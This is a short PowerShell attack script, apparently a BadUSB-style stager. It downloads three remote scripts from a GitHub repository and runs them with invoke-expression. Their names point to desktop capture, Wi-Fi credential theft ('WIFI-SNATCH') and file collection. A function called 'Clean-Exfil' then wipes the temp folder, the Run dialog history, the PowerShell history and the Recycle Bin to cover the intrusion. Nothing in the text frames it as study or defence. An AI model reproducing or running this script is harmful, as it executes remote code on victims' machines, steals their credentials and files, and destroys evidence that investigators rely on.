$pa = iwr https://github.com/skekic16/lol/raw/main/DP.ps1?dl=1; invoke-expression $pa

$pg = iwr https://github.com/skekic16/lol/raw/main/WIFI-SNATCH.ps1?dl=1; invoke-expression $pg

$pw = iwr https://github.com/skekic16/lol/raw/main/files.ps1?dl=1; invoke-expression $pw






start-sleep 60




rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
rm "$env:USERPROFILE\bORG2.exe"
function Clean-Exfil { 

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Remove-Item (Get-PSreadlineOption).HistorySavePath

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}
Clean-Exfil
